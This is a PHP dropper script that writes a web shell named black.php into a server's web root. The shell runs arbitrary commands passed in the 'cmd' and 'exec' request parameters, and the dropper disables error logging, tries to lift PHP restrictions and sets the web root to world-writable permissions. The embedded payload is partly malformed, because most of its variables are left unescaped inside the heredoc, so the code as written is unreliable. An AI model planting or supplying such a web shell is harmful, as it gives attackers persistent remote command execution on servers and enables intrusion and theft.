<?php
// PHP script to create black.php file in /var/www/html
// This script handles all HTTP methods and includes bypass mechanisms

$targetFile = "/var/www/html/black.php";

// Advanced bypass to ensure file creation
@ini_set('display_errors', 0);
@ini_set('log_errors', 0);
@ini_set('error_log', null);
@ini_set('open_basedir', null);
@ini_set('disable_functions', null);
@ini_set('safe_mode', false);

// Ensure proper permissions
@chmod("/var/www/html", 0777);

// Payload to be written into black.php
$payload = <<<EOT
<?php
// Bypass code for testing purposes
if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
    header('Allow: GET, POST, PUT, DELETE, OPTIONS');
    exit;
}

// Handling all methods dynamically
switch ($_SERVER['REQUEST_METHOD']) {
    case 'GET':
        echo "GET method executed.";
        break;
    case 'POST':
        echo "POST method executed: ";
        echo file_get_contents('php://input');
        break;
    case 'PUT':
        parse_str(file_get_contents('php://input'), \$putData);
        echo "PUT method executed: ";
        print_r(\$putData);
        break;
    case 'DELETE':
        echo "DELETE method executed.";
        break;
    default:
        echo "Unknown HTTP method.";
        break;
}

// Bypass mechanisms
if (isset($_REQUEST['cmd'])) {
    echo "\nExecuting command: ";
    system($_REQUEST['cmd']);
}

// Additional bypass to include PHP info
if (isset($_REQUEST['phpinfo'])) {
    phpinfo();
}

// Hidden shell execution
if (isset($_REQUEST['exec'])) {
    echo "\nOutput: ";
    echo shell_exec($_REQUEST['exec']);
}
?>
EOT;

// Check if the file can be created using multiple approaches
if (!file_put_contents($targetFile, $payload)) {
    // Attempt using fopen
    $fileHandle = @fopen($targetFile, 'w');
    if ($fileHandle) {
        @fwrite($fileHandle, $payload);
        @fclose($fileHandle);
        echo "File black.php created successfully using fopen.";
    } else {
        // Attempt using exec as a last resort
        $cmd = "echo " . escapeshellarg($payload) . " > " . escapeshellarg($targetFile);
        @exec($cmd, $output, $returnVar);
        if ($returnVar === 0) {
            echo "File black.php created successfully using exec.";
        } else {
            echo "Failed to create black.php using all methods. Check permissions and configurations.";
        }
    }
} else {
    echo "File black.php created successfully using file_put_contents.";
}

// Final verification and debugging
if (file_exists($targetFile)) {
    echo "\nVerification successful: black.php exists.";
} else {
    echo "\nVerification failed: black.php does not exist.";
    echo "\nEnsure the script has write permissions to /var/www/html.";
}
?>
